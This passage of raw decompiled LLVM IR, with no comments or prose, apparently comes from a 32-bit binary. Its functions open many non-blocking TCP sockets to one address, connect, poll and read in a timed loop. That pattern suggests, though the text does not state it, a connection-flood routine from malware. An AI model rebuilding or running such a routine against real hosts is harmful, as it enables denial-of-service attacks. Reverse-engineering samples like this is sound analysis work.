  %v5_da80 = call i32 @function_ac54(i32 %v3_d644, i32 %v1_d664, i32 %v1_d664, i32 0)
  %sext5 = mul i32 %v5_da80, 16777216
  %v1_da84 = sdiv i32 %sext5, 16777216
  store i32 %v1_da84, i32* %r3.global-to-local, align 4
  store i32 %v1_d664, i32* %r2.global-to-local, align 4
  %v1_da8c = trunc i32 %v1_da84 to i8
  store i8 %v1_da8c, i8* %v4_d8e0, align 4
  %v0_da90 = load i32, i32* %r3.global-to-local, align 4
  %v3_da9030 = udiv i32 %v0_da90, 256
  %v1_da94 = trunc i32 %v3_da9030 to i8
  %v2_da94 = load i32, i32* %r2.global-to-local, align 4
  %v3_da94 = add i32 %v2_da94, 17
  %v4_da94 = inttoptr i32 %v3_da94 to i8*
  store i8 %v1_da94, i8* %v4_da94, align 1
  store i32 %v1_d97c, i32* %r3.global-to-local, align 4
  %v2_daa8 = load i8, i8* %v1_d980, align 2
  %v3_daa8 = zext i8 %v2_daa8 to i32
  store i32 %v3_daa8, i32* %r2.global-to-local, align 4
  %v3_daac = load i8, i8* %v2_d984, align 1
  %v4_daac = zext i8 %v3_daac to i32
  %v4_dab0 = mul nuw nsw i32 %v4_daac, 256
  %v5_dab0 = or i32 %v4_dab0, %v3_daa8
  store i32 %v5_dab0, i32* %r3.global-to-local, align 4
  %v3_dabc = call i32 @function_aafc(i8* %v4_d6a0, i32 %v5_dab0)
  %sext6 = mul i32 %v3_dabc, 16777216
  %v1_dac0 = sdiv i32 %sext6, 16777216
  store i32 %v1_dac0, i32* %r3.global-to-local, align 4
  store i32 %v3_d644, i32* %r2.global-to-local, align 4
  %v1_dac8 = trunc i32 %v1_dac0 to i8
  store i8 %v1_dac8, i8* %v4_d9a0, align 2
  %v0_dacc = load i32, i32* %r3.global-to-local, align 4
  %v3_dacc31 = udiv i32 %v0_dacc, 256
  %v1_dad0 = trunc i32 %v3_dacc31 to i8
  %v2_dad0 = load i32, i32* %r2.global-to-local, align 4
  %v3_dad0 = add i32 %v2_dad0, 11
  %v4_dad0 = inttoptr i32 %v3_dad0 to i8*
  store i8 %v1_dad0, i8* %v4_dad0, align 1
  store i32 %stack_var_-88.0, i32* %r3.global-to-local, align 4
  %v9_dadc = icmp eq i32 %stack_var_-88.0, %arg7
  br i1 %v9_dadc, label %dec_label_pc_dae4, label %dec_label_pc_db08

dec_label_pc_dae4:                                ; preds = %dec_label_pc_d9d0
  %v2_dae8 = call i32 @function_1096c(i32* null)
  store i32 %v2_dae8, i32* %r2.global-to-local, align 4
  store i32 %v2_d9bc, i32* %r3.global-to-local, align 4
  %v8_daf8 = icmp sgt i32 %v2_dae8, %v2_d9bc
  br i1 %v8_daf8, label %dec_label_pc_db18, label %dec_label_pc_dafc

dec_label_pc_dafc:                                ; preds = %dec_label_pc_dae4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d9d0

dec_label_pc_db08:                                ; preds = %dec_label_pc_d9d0
  %v1_db0c = add i32 %stack_var_-88.0, 1
  store i32 %v1_db0c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d9d0

dec_label_pc_db18:                                ; preds = %dec_label_pc_dae4, %dec_label_pc_d5a8, %dec_label_pc_d568, %dec_label_pc_d544
  %v12_db20 = phi i32 [ %v6_d5cc, %dec_label_pc_d5a8 ], [ 0, %dec_label_pc_d568 ], [ %v3_d554, %dec_label_pc_d544 ], [ %v2_dae8, %dec_label_pc_dae4 ]
  store i32 %v3_d4b8, i32* @r4, align 4
  store i32 %v6_d4b8, i32* @fp, align 4
  ret i32 %v12_db20

; uselistorder directives
  uselistorder i32 %v1_db0c, { 1, 0 }
  uselistorder i32 %v1_dac0, { 1, 0 }
  uselistorder i32 %v1_da84, { 1, 0 }
  uselistorder i32 %v0_da48, { 1, 0 }
  uselistorder i32 %v3_da30, { 1, 0 }
  uselistorder i32 %v0_da18, { 1, 0 }
  uselistorder i32 %stack_var_-88.0, { 0, 2, 1 }
  uselistorder i32 %v2_d9bc, { 1, 0, 2 }
  uselistorder i32 %v3_d9a4, { 1, 0 }
  uselistorder i32 %v1_d998, { 1, 0 }
  uselistorder i32 %v1_d97c, { 0, 2, 1 }
  uselistorder i32 %v1_d95c, { 1, 0 }
  uselistorder i32 %v3_d948, { 2, 0, 1 }
  uselistorder i8 %v0_d904.sink.off0, { 1, 0 }
  uselistorder i32 %v3_d924, { 1, 0 }
  uselistorder i32 %v0_d904, { 1, 0 }
  uselistorder i32 %v0_d8b8, { 1, 0 }
  uselistorder i32 %v2_d8a0, { 1, 0, 2 }
  uselistorder i32 %storemerge1421, { 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_d7b0, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i8* %v2_d724, { 1, 5, 2, 6, 3, 7, 4, 8, 0, 9 }
  uselistorder i32 %v3_d6bc, { 1, 0 }
  uselistorder i32 %v0_d6a4, { 1, 0 }
  uselistorder i32 %v1_d664, { 5, 7, 6, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 22, 21, 20, 19, 18, 0, 1, 2, 3, 4, 23, 24, 25, 26 }
  uselistorder i32 %v3_d644, { 12, 11, 10, 8, 6, 23, 9, 7, 4, 5, 22, 3, 21, 20, 19, 18, 17, 16, 24, 15, 14, 13, 2, 1, 0 }
  uselistorder i32 %v1_d614, { 1, 0 }
  uselistorder i32 %v3_d528, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %stack_var_-68, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 7, 8, 5, 6, 12, 13, 9, 10, 11, 14, 15, 16, 17, 18, 19, 20, 21, 22, 25, 26, 23, 24, 28, 29, 27, 30, 31, 32, 33, 34, 35, 36, 37, 38, 55, 39, 40, 42, 41, 43, 45, 44, 46, 48, 47, 49, 51, 50, 52, 54, 53, 1, 56, 57, 58, 59, 60, 61, 64, 62, 63, 65, 66, 67, 68, 70, 69, 71, 72, 74, 73, 75, 76, 78, 77, 79, 80, 81, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_ac54, { 1, 0 }
  uselistorder i32 (i32)* @function_12410, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_aa9c, { 3, 2, 1, 0 }
  uselistorder i32 ()* @function_8400, { 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg4, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_d938, { 1, 0 }
  uselistorder label %dec_label_pc_d898, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_d790, { 1, 0 }
  uselistorder label %dec_label_pc_d610, { 1, 0 }
  uselistorder label %dec_label_pc_d544, { 1, 0 }
}

define i32 @function_db48(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_db48:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_db4c = load i32, i32* @r4, align 4
  store i32 %v3_db4c, i32* %stack_var_-20, align 4
  %v6_db4c = load i32, i32* @fp, align 4
  store i32 56148, i32* %stack_var_-4, align 4
  %v2_db50 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_db50, i32* @fp, align 4
  %v0_db6c = call i32 @function_106fc()
  %tmp = icmp slt i32 %v0_db6c, 0
  %v3_db74 = zext i1 %tmp to i32
  %v2_db78 = add i32 %v3_db74, %v0_db6c
  %v3_db7c = sdiv i32 %v2_db78, 2
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-68, align 4
  %v3_db9c = urem i32 %arg2, 65536
  %v1_dba4 = call i32 @function_12434(i32 %v3_db9c)
  %v3_dbc8 = call i32 @function_9680(i32 %arg1, i32* nonnull %stack_var_-64)
  %v2_dbd0 = icmp eq i32 %v3_dbc8, 0
  br i1 %v2_dbd0, label %dec_label_pc_dbdc, label %dec_label_pc_e054

dec_label_pc_dbdc:                                ; preds = %dec_label_pc_db48
  %v16_db4c = ptrtoint i32* %stack_var_-20 to i32
  %v3_dbf8 = mul i32 %v3_db7c, 8
  %v1_dbfc = or i32 %v3_dbf8, 3
  %v1_dc00 = add i32 %v1_dbfc, 3
  %v3_dc04 = and i32 %v1_dc00, -4
  %v1_dc0c = load i32, i32* @sp, align 4
  %v2_dc0c = sub i32 %v1_dc0c, %v3_dc04
  %v1_dc1c = add i32 %v2_dc0c, 7
  %v3_dc20 = and i32 %v1_dc1c, -4
  %v2_dc44 = mul i32 %v3_db7c, 5
  store i32 %v2_dc44, i32* @r2, align 4
  %v2_dc58 = inttoptr i32 %v3_dc20 to i8*
  %v3_dc58 = call i32 @function_11d70(i8* %v2_dc58, i32 0)
  %v1_dc60 = call i32 @function_127d4(i32 1024)
  store i32 1024, i32* @r2, align 4
  %v2_dc7c = inttoptr i32 %v1_dc60 to i8*
  %v3_dc7c = call i32 @function_11d70(i8* %v2_dc7c, i32 0)
  %v2_dc84 = call i32 @function_1096c(i32* null)
  store i32 %v2_dc84, i32* %r2.global-to-local, align 4
  %v2_dc90 = add i32 %v2_dc84, %arg3
  %v2_ddcc = ptrtoint i32* %stack_var_-196 to i32
  %v2_de90 = ptrtoint i32* %stack_var_-204 to i32
  %v2_ded8 = ptrtoint i32* %stack_var_-208 to i32
  %v4_dfc8 = inttoptr i32 %v1_dc60 to i32*
  %v3_dd6c = bitcast i32* %stack_var_-68 to %sockaddr*
  %v8_e03448 = icmp sgt i32 %v2_db78, 1
  %v2_dcb8 = add i32 %v3_dc20, 4
  %v2_de28 = add i32 %v16_db4c, -176
  br label %dec_label_pc_e03c

dec_label_pc_dca8:                                ; preds = %dec_label_pc_e02c.preheader, %dec_label_pc_e020
  %storemerge251 = phi i32 [ %v1_e024, %dec_label_pc_e020 ], [ 0, %dec_label_pc_e02c.preheader ]
  store i32 %v3_dc20, i32* %r2.global-to-local, align 4
  %v3_dcb4 = mul i32 %storemerge251, 8
  %v2_dcbc = add i32 %v2_dcb8, %v3_dcb4
  %v1_dcc0 = inttoptr i32 %v2_dcbc to i8*
  %v2_dcc0 = load i8, i8* %v1_dcc0, align 4
  %v6_dccc = icmp eq i8 %v2_dcc0, 0
  %v7_dccc = icmp eq i8 %v2_dcc0, 1
  br i1 %v7_dccc, label %dec_label_pc_dde0.lr.ph, label %dec_label_pc_dcd4

dec_label_pc_dcd4:                                ; preds = %dec_label_pc_dca8
  %v7_dcd8 = icmp eq i8 %v2_dcc0, 2
  br i1 %v7_dcd8, label %dec_label_pc_dfa0, label %dec_label_pc_dce0

dec_label_pc_dce0:                                ; preds = %dec_label_pc_dcd4
  br i1 %v6_dccc, label %dec_label_pc_dcf0, label %dec_label_pc_e020

dec_label_pc_dcf0:                                ; preds = %dec_label_pc_dce0
  store i32 %storemerge251, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_dd00 = call i32 @function_1263c(i32 2, i32 1, i32 0)
  %v2_dd0c = load i32, i32* @r4, align 4
  %v5_dd0c = mul i32 %v2_dd0c, 8
  %v6_dd0c = add i32 %v5_dd0c, %v3_dc20
  %v7_dd0c = inttoptr i32 %v6_dd0c to i32*
  store i32 %v3_dd00, i32* %v7_dd0c, align 4
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v5_dd18 = add i32 %v3_dcb4, %v3_dc20
  %v6_dd18 = inttoptr i32 %v5_dd18 to i32*
  %v7_dd18 = load i32, i32* %v6_dd18, align 4
  store i32 %v7_dd18, i32* @r4, align 4
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v7_dd24 = load i32, i32* %v6_dd18, align 4
  store i32 0, i32* @r2, align 4
  %v2_dd34 = call i32 @function_10560(i32 %v7_dd24, i32 3)
  %v1_dd3c = or i32 %v2_dd34, 2048
  %v0_dd40 = load i32, i32* @r4, align 4
  store i32 %v1_dd3c, i32* @r2, align 4
  %v2_dd4c = call i32 @function_10560(i32 %v0_dd40, i32 4)
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v7_dd58 = load i32, i32* %v6_dd18, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_dd6c = call i32 @function_124f8(i32 %v7_dd58, %sockaddr* %v3_dd6c, i32 16)
  %v3_dd74 = icmp eq i32 %v4_dd6c, -1
  br i1 %v3_dd74, label %dec_label_pc_dd7c, label %dec_label_pc_dd90

dec_label_pc_dd7c:                                ; preds = %dec_label_pc_dcf0
  %v0_dd7c = call i32 @function_10a18()
  %v1_dd84 = inttoptr i32 %v0_dd7c to i32*
  %v2_dd84 = load i32, i32* %v1_dd84, align 4
  %v7_dd88 = icmp eq i32 %v2_dd84, 115
  br i1 %v7_dd88, label %dec_label_pc_dda8, label %dec_label_pc_dd90

dec_label_pc_dd90:                                ; preds = %dec_label_pc_dcf0, %dec_label_pc_dd7c
  store i32 %v3_dc20, i32* %r2.global-to-local, align 4
  %v7_dd98 = load i32, i32* %v6_dd18, align 4
  %v1_dda0 = call i32 @function_10678(i32 %v7_dd98)
  br label %dec_label_pc_e020

dec_label_pc_dda8:                                ; preds = %dec_label_pc_dd7c
  store i32 %v2_dcbc, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v1_dcc0, align 4
  br label %dec_label_pc_e020

dec_label_pc_dde0.lr.ph:                          ; preds = %dec_label_pc_dca8
  br label %dec_label_pc_dde0

dec_label_pc_dde0:                                ; preds = %dec_label_pc_dde0.lr.ph, %dec_label_pc_dde0
  %storemerge37 = phi i32 [ 0, %dec_label_pc_dde0.lr.ph ], [ %v1_ddf4, %dec_label_pc_dde0 ]
  store i32 %v2_ddcc, i32* %r2.global-to-local, align 4
  %v5_ddec = mul nuw nsw i32 %storemerge37, 4
  %v6_ddec = add i32 %v5_ddec, %v2_ddcc
  %v7_ddec = inttoptr i32 %v6_ddec to i32*
  store i32 0, i32* %v7_ddec, align 4
  %v1_ddf4 = add nuw nsw i32 %storemerge37, 1
  %tmp42 = icmp ult i32 %v1_ddf4, 32
  br i1 %tmp42, label %dec_label_pc_dde0, label %dec_label_pc_de08

dec_label_pc_de08:                                ; preds = %dec_label_pc_dde0
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v5_de10 = add i32 %v3_dcb4, %v3_dc20
  %v6_de10 = inttoptr i32 %v5_de10 to i32*
  %v7_de10 = load i32, i32* %v6_de10, align 4
  %v3_de14 = udiv i32 %v7_de10, 32
  store i32 -176, i32* %r2.global-to-local, align 4
  %v3_de20 = mul nuw nsw i32 %v3_de14, 4
  %v2_de2c = add i32 %v2_de28, %v3_de20
  %v1_de30 = inttoptr i32 %v2_de2c to i32*
  %v2_de30 = load i32, i32* %v1_de30, align 4
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v7_de3c = load i32, i32* %v6_de10, align 4
  %v1_de40 = urem i32 %v7_de3c, 32
  %v6_de48 = shl i32 1, %v1_de40
  %v2_de4c = or i32 %v6_de48, %v2_de30
  store i32 %v2_de4c, i32* %v1_de30, align 4
  store i32 0, i32* %stack_var_-204, align 4
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v7_de84 = load i32, i32* %v6_de10, align 4
  %v1_de88 = add i32 %v7_de84, 1
  store i32 %v1_de88, i32* %r2.global-to-local, align 4
  %v1_de94 = load i32, i32* @sp, align 4
  %v2_de94 = inttoptr i32 %v1_de94 to i32*
  store i32 %v2_de90, i32* %v2_de94, align 4
  %v0_de98 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_ddcc, i32* %r2.global-to-local, align 4
  %v4_dea8 = load i32, i32* %stack_var_-204, align 4
  %v5_dea8 = call i32 @function_108bc(i32 %v0_de98, i32 0, i32 %v2_ddcc, i32 0, i32 %v4_dea8)
  %v7_deb8 = icmp eq i32 %v5_dea8, 1
  br i1 %v7_deb8, label %dec_label_pc_dec0, label %dec_label_pc_df5c

dec_label_pc_dec0:                                ; preds = %dec_label_pc_de08
  store i32 4, i32* %stack_var_-208, align 4
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v7_ded0 = load i32, i32* %v6_de10, align 4
  store i32 %v7_ded0, i32* %r2.global-to-local, align 4
  %v1_dedc = load i32, i32* @sp, align 4
  %v2_dedc = inttoptr i32 %v1_dedc to i32*
  store i32 %v2_ded8, i32* %v2_dedc, align 4
  %v0_dee0 = load i32, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_def0 = load i32, i32* %stack_var_-208, align 4
  %v6_def0 = call i32 @function_12550(i32 %v0_dee0, i32 1, i32 4, i32* nonnull %stack_var_-212, i32 %v4_def0)
  %v3_def4 = load i32, i32* %stack_var_-212, align 4
  %v2_def8 = icmp eq i32 %v3_def4, 0
  br i1 %v2_def8, label %dec_label_pc_df38, label %dec_label_pc_df00

dec_label_pc_df00:                                ; preds = %dec_label_pc_dec0
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v7_df08 = load i32, i32* %v6_de10, align 4
  %v1_df10 = call i32 @function_10678(i32 %v7_df08)
  store i32 %v2_dcbc, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_dcc0, align 4
  br label %dec_label_pc_e020

dec_label_pc_df38:                                ; preds = %dec_label_pc_dec0
  store i32 %v2_dcbc, i32* %r2.global-to-local, align 4
  store i8 2, i8* %v1_dcc0, align 4
  br label %dec_label_pc_e020

dec_label_pc_df5c:                                ; preds = %dec_label_pc_de08
  %v3_df60 = icmp eq i32 %v5_dea8, -1
  br i1 %v3_df60, label %dec_label_pc_df68, label %dec_label_pc_e020

dec_label_pc_df68:                                ; preds = %dec_label_pc_df5c
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v7_df70 = load i32, i32* %v6_de10, align 4
  %v1_df78 = call i32 @function_10678(i32 %v7_df70)
  store i32 %v2_dcbc, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_dcc0, align 4
  br label %dec_label_pc_e020

dec_label_pc_dfa0:                                ; preds = %dec_label_pc_dcd4
  %v2_dfa8 = call i32 @function_9a64(i32 %v1_dc60, i32 1024)
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v5_dfb4 = add i32 %v3_dcb4, %v3_dc20
  %v6_dfb4 = inttoptr i32 %v5_dfb4 to i32*
  %v7_dfb4 = load i32, i32* %v6_dfb4, align 4
  store i32 1024, i32* %r2.global-to-local, align 4
  %v5_dfc8 = call i32 @function_125ac(i32 %v7_dfb4, i32* %v4_dfc8, i32 1024, i32 16384)
  %v3_dfd0 = icmp eq i32 %v5_dfc8, -1
  br i1 %v3_dfd0, label %dec_label_pc_dfd8, label %dec_label_pc_e020

dec_label_pc_dfd8:                                ; preds = %dec_label_pc_dfa0
  %v0_dfd8 = call i32 @function_10a18()
  %v1_dfe0 = inttoptr i32 %v0_dfd8 to i32*
  %v2_dfe0 = load i32, i32* %v1_dfe0, align 4
  %v7_dfe4 = icmp eq i32 %v2_dfe0, 11
  br i1 %v7_dfe4, label %dec_label_pc_e020, label %dec_label_pc_dfec

dec_label_pc_dfec:                                ; preds = %dec_label_pc_dfd8
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v7_dff4 = load i32, i32* %v6_dfb4, align 4
  %v1_dffc = call i32 @function_10678(i32 %v7_dff4)
  store i32 %v2_dcbc, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_dcc0, align 4
  br label %dec_label_pc_e020

dec_label_pc_e020:                                ; preds = %dec_label_pc_dce0, %dec_label_pc_df5c, %dec_label_pc_dfa0, %dec_label_pc_dfd8, %dec_label_pc_df68, %dec_label_pc_df38, %dec_label_pc_df00, %dec_label_pc_dda8, %dec_label_pc_dd90, %dec_label_pc_dfec
  %v1_e024 = add nuw nsw i32 %storemerge251, 1
  store i32 %v1_e024, i32* %r2.global-to-local, align 4
  %v5_e038 = icmp slt i32 %v1_e024, %v3_db7c
  br i1 %v5_e038, label %dec_label_pc_dca8, label %dec_label_pc_e03c

dec_label_pc_e03c:                                ; preds = %dec_label_pc_e02c.preheader, %dec_label_pc_e020, %dec_label_pc_dbdc
  %v2_e040 = call i32 @function_1096c(i32* null)
  store i32 %v2_e040, i32* %r2.global-to-local, align 4
  %v5_e050 = icmp slt i32 %v2_e040, %v2_dc90
  br i1 %v5_e050, label %dec_label_pc_e02c.preheader, label %dec_label_pc_e054

dec_label_pc_e02c.preheader:                      ; preds = %dec_label_pc_e03c
  store i32 0, i32* %r2.global-to-local, align 4
  br i1 %v8_e03448, label %dec_label_pc_dca8, label %dec_label_pc_e03c

dec_label_pc_e054:                                ; preds = %dec_label_pc_e03c, %dec_label_pc_db48
  %v12_e05c = phi i32 [ %v3_dbc8, %dec_label_pc_db48 ], [ %v2_e040, %dec_label_pc_e03c ]
  %v2_e05c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_e05c, i32* @r4, align 4
  store i32 %v6_db4c, i32* @fp, align 4
  ret i32 %v12_e05c

; uselistorder directives
  uselistorder i32 %v1_e024, { 2, 1, 0 }
  uselistorder i32 %storemerge37, { 1, 0 }
  uselistorder i8* %v1_dcc0, { 3, 2, 0, 1, 4, 5 }
  uselistorder i32 %v2_dcbc, { 3, 2, 0, 1, 4, 5 }
  uselistorder i32 %v3_dcb4, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge251, { 0, 8, 7, 6, 5, 4, 3, 2, 1, 12, 11, 10, 9, 13 }
  uselistorder i32 %v2_ddcc, { 3, 2, 0, 1 }
  uselistorder i32 %v1_dc60, { 1, 0, 2 }
  uselistorder i32 %v3_dc20, { 0, 1, 5, 2, 3, 4, 7, 6 }
  uselistorder i32 %v3_db7c, { 1, 2, 0 }
  uselistorder i32 %v0_db6c, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-212, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 34, 31, 30, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 32, 33, 0 }
  uselistorder i32 (i32, i32*, i32, i32)* @function_125ac, { 0, 1, 2, 3, 4, 10, 11, 5, 6, 7, 8, 9, 12 }
  uselistorder i32 16384, { 0, 8, 13, 5, 14, 6, 15, 7, 16, 3, 17, 4, 18, 1, 19, 2, 20, 9, 10, 11, 12 }
  uselistorder i32 (i32, i32)* @function_9a64, { 2, 1, 0 }
  uselistorder i32 -176, { 1, 0 }
  uselistorder label %dec_label_pc_e020, { 9, 3, 2, 4, 1, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_dde0, { 1, 0 }
  uselistorder label %dec_label_pc_dd90, { 1, 0 }
}

define i32 @function_e060(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_e060:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_e064 = load i32, i32* @r4, align 4
  store i32 %v3_e064, i32* %stack_var_-20, align 4
  %v6_e064 = load i32, i32* @fp, align 4
  %v0_e084 = call i32 @function_106fc()
  %tmp = icmp slt i32 %v0_e084, 0
  %v3_e08c = zext i1 %tmp to i32
  %v2_e090 = add i32 %v3_e08c, %v0_e084
  %v3_e094 = sdiv i32 %v2_e090, 2
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-76, align 4
  %v3_e0b4 = urem i32 %arg2, 65536
  %v1_e0bc = call i32 @function_12434(i32 %v3_e0b4)
  %v3_e0e0 = call i32 @function_9680(i32 %arg1, i32* nonnull %stack_var_-72)
  %v2_e0e8 = icmp eq i32 %v3_e0e0, 0
  br i1 %v2_e0e8, label %dec_label_pc_e0f4, label %dec_label_pc_e614

dec_label_pc_e0f4:                                ; preds = %dec_label_pc_e060
  %v16_e064 = ptrtoint i32* %stack_var_-20 to i32
  %v3_e110 = mul i32 %v3_e094, 8
  %v1_e114 = or i32 %v3_e110, 3
  %v1_e118 = add i32 %v1_e114, 3
  %v3_e11c = and i32 %v1_e118, -4
  %v1_e124 = load i32, i32* @sp, align 4
  %v2_e124 = sub i32 %v1_e124, %v3_e11c
  %v1_e134 = add i32 %v2_e124, 7
  %v3_e138 = and i32 %v1_e134, -4
  %v2_e15c = mul i32 %v3_e094, 5
  store i32 %v2_e15c, i32* @r2, align 4
  %v2_e170 = inttoptr i32 %v3_e138 to i8*
  %v3_e170 = call i32 @function_11d70(i8* %v2_e170, i32 0)
  %v1_e178 = call i32 @function_127d4(i32 1024)
  store i32 1024, i32* @r2, align 4
  %v2_e194 = inttoptr i32 %v1_e178 to i8*
  %v3_e194 = call i32 @function_11d70(i8* %v2_e194, i32 0)
  %v2_e19c = call i32 @function_1096c(i32* null)
  store i32 %v2_e19c, i32* %r2.global-to-local, align 4
  %v2_e1a8 = add i32 %v2_e19c, %arg3
  %v2_e2e4 = ptrtoint i32* %stack_var_-204 to i32
  %v2_e3a8 = ptrtoint i32* %stack_var_-212 to i32
  %v2_e3f0 = ptrtoint i32* %stack_var_-216 to i32
  %v3_e284 = bitcast i32* %stack_var_-76 to %sockaddr*
  %v8_e5f457 = icmp sgt i32 %v2_e090, 1
  %v2_e1d0 = add i32 %v3_e138, 4
  %v2_e340 = add i32 %v16_e064, -184
  br label %dec_label_pc_e5fc

dec_label_pc_e1c0:                                ; preds = %dec_label_pc_e5ec.preheader, %dec_label_pc_e5e0
  %storemerge360 = phi i32 [ %v1_e5e4, %dec_label_pc_e5e0 ], [ 0, %dec_label_pc_e5ec.preheader ]
  store i32 %v3_e138, i32* %r2.global-to-local, align 4
  %v3_e1cc = mul i32 %storemerge360, 8
  %v2_e1d4 = add i32 %v2_e1d0, %v3_e1cc
  %v1_e1d8 = inttoptr i32 %v2_e1d4 to i8*
  %v2_e1d8 = load i8, i8* %v1_e1d8, align 4
  %v6_e1e4 = icmp eq i8 %v2_e1d8, 0
  %v7_e1e4 = icmp eq i8 %v2_e1d8, 1
  br i1 %v7_e1e4, label %dec_label_pc_e2f8.lr.ph, label %dec_label_pc_e1ec

dec_label_pc_e1ec:                                ; preds = %dec_label_pc_e1c0
  %v7_e1f0 = icmp eq i8 %v2_e1d8, 2
  br i1 %v7_e1f0, label %dec_label_pc_e4cc.lr.ph, label %dec_label_pc_e1f8

dec_label_pc_e1f8:                                ; preds = %dec_label_pc_e1ec
  br i1 %v6_e1e4, label %dec_label_pc_e208, label %dec_label_pc_e5e0

dec_label_pc_e208:                                ; preds = %dec_label_pc_e1f8
  store i32 %storemerge360, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_e218 = call i32 @function_1263c(i32 2, i32 1, i32 0)
  %v2_e224 = load i32, i32* @r4, align 4
  %v5_e224 = mul i32 %v2_e224, 8
  %v6_e224 = add i32 %v5_e224, %v3_e138
  %v7_e224 = inttoptr i32 %v6_e224 to i32*
  store i32 %v3_e218, i32* %v7_e224, align 4
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v5_e230 = add i32 %v3_e1cc, %v3_e138
  %v6_e230 = inttoptr i32 %v5_e230 to i32*
  %v7_e230 = load i32, i32* %v6_e230, align 4
  store i32 %v7_e230, i32* @r4, align 4
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v7_e23c = load i32, i32* %v6_e230, align 4
  store i32 0, i32* @r2, align 4
  %v2_e24c = call i32 @function_10560(i32 %v7_e23c, i32 3)
  %v1_e254 = or i32 %v2_e24c, 2048
  %v0_e258 = load i32, i32* @r4, align 4
  store i32 %v1_e254, i32* @r2, align 4
  %v2_e264 = call i32 @function_10560(i32 %v0_e258, i32 4)
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v7_e270 = load i32, i32* %v6_e230, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_e284 = call i32 @function_124f8(i32 %v7_e270, %sockaddr* %v3_e284, i32 16)
  %v3_e28c = icmp eq i32 %v4_e284, -1
  br i1 %v3_e28c, label %dec_label_pc_e294, label %dec_label_pc_e2a8

dec_label_pc_e294:                                ; preds = %dec_label_pc_e208
  %v0_e294 = call i32 @function_10a18()
  %v1_e29c = inttoptr i32 %v0_e294 to i32*
  %v2_e29c = load i32, i32* %v1_e29c, align 4
  %v7_e2a0 = icmp eq i32 %v2_e29c, 115
